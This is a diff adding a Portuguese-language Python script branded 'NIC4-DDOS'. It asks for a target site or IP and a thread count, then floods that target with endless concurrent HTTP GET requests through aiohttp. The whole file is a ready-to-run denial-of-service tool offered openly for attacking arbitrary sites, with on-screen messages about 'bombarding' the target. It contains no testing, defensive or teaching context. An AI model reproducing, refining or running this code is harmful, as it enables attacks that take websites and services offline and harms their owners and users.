@@ -1,0 +1,69 @@
+# -*- coding: utf-8 -*-
+
+import asyncio
+import sys
+import aiohttp
+from pyfiglet import figlet_format
+
+print(figlet_format("NIC4-DDOS"))
+
+print("""
+     ⣀⣠⠤⠶⠶⣖⡛⠛⠿⠿⠯⠭⠍⠉⣉⠛⠚⠛⠲⣄
+ ⢀⡴⠋⠁⠀⡉⠁⢐⣒⠒⠈⠁⠀⠀⠀⠈⠁⢂⢅⡂⠀⠀⠘⣧
+ ⣼⠀⠀⠀⠁⠀⠀⠀⠂⠀⠀⠀⠀⢀⣀⣤⣤⣄⡈⠈⠀⠀⠀⠘⣇
+⢠⡾⠡⠄⠀⠀⠾⠿⠿⣷⣦⣤⠀⠀⣾⣋⡤⠿⠿⠿⠿⠆⠠⢀⣀⡒⠼⢷⣄
+⣿⠊⠊⠶⠶⢦⣄⡄⠀⢀⣿⠀⠀⠀⠈⠁⠀⠀⠙⠳⠦⠶⠞⢋⣍⠉⢳⡄⠈⣧
+⢹⣆⡂⢀⣿⠀⠀⡀⢴⣟⠁⠀⢀⣠⣘⢳⡖⠀⠀⣀⣠⡴⠞⠋⣽⠷⢠⠇⠀⣼
+⠀⢻⡀⢸⣿⣷⢦⣄⣀⣈⣳⣆⣀⣀⣤⣭⣴⠚⠛⠉⣹⣧⡴⣾⠋⠀⠀⣘⡼⠃
+⠀⢸⡇⢸⣷⣿⣤⣏⣉⣙⣏⣉⣹⣁⣀⣠⣼⣶⡾⠟⢻⣇⡼⠁⠀⠀⣰⠋
+⠀⢸⡇⠸⣿⡿⣿⢿⡿⢿⣿⠿⠿⣿⠛⠉⠉⢧⠀⣠⡴⠋⠀⠀⠀⣠⠇
+⠀⢸⠀⠀⠹⢯⣽⣆⣷⣀⣻⣀⣀⣿⣄⣤⣴⠾⢛⡉⢄⡢⢔⣠⠞⠁
+⠀⢸⠀⠀⠀⠢⣀⠀⠈⠉⠉⠉⠉⣉⣀⠠⣐⠦⠑⣊⡥⠞⠋
+⠀⢸⡀⠀⠁⠂⠀⠀⠀⠀⠀⠀⠒⠈⠁⣀⡤⠞⠋⠁
+  ⠙⠶⢤⣤⣤⣤⣤⡤⠴⠖⠚⠛⠉⠁
+""")
+
+try:
+    while True:
+        url = input("site ou ip fudidoXD: ").strip()
+        if not url:
+            continue
+        if not url.startswith(("http://", "https://")):
+            url = f"http://{url}"
+        break
+    print("\nURL Final:", url)
+except KeyboardInterrupt:
+    sys.exit("\n\n[!] Script interrompido pelo usuário. Saindo...")
+
+CONEXOES = int(input("quantidade de threads: "))
+
+async def enviar_requisicao(session, url_alvo):
+    while True:
+        try:
+            async with session.get(url_alvo, timeout=aiohttp.ClientTimeout(total=2.0)) as response:
+                response.close()
+        except asyncio.CancelledError:
+            break
+        except Exception:
+            pass
+
+async def iniciar():
+    print(f"\n[*] Bombardeando com {CONEXOES} threads persistentes...")
+    print("[*] Pressione Ctrl + C para parar a qualquer momento.\n")
+
+    connector = aiohttp.TCPConnector(
+        limit=None, 
+        force_close=False, 
+        enable_cleanup_closed=True, 
+        ttl_dns_cache=600
+    )
+
+    async with aiohttp.ClientSession(connector=connector, skip_auto_headers={'User-Agent'}) as session:
+        tarefas = [asyncio.create_task(enviar_requisicao(session, url)) for _ in range(CONEXOES)]
+        await asyncio.gather(*tarefas)
+
+try:
+    asyncio.run(iniciar())
+except KeyboardInterrupt:
+    print("\n[*] DDoS finalizado pelo usuário.")
+    sys.exit(0)
